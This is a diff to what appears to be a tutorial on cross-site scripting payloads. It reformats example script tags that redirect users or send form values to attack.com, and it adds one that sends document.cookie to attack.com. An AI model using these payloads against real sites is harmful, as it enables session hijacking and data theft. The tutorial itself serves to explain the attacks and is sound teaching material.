@@ -18,18 +18,28 @@ Payloads are basically Javascript codes that we can execute on target users' com
 
 Examples of payloads:
 
-```
+```javascript
 Basic alert payload:
 <script>alert('XSS')</script>
 
 
 Redirection payload:
-<script>window.location='http://attack.com'</script>
+<script>
+window.location='http://attack.com'
+</script>
 
 
 Form data capture payload:
-<script>document.location='http://attack.com/logger.php?data=' +document.getElementById('form_id').value </script>
+<script>
+document.location='http://attack.com/logger.php?data=' +document.getElementById('form_id').value 
+</script>
 
+AJAX command execution payload:
+<script>
+const xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'http://attack.com/log.php?data?=' + document.cookie, true);
+xhttp.send();
+</script>
 
 ```
 
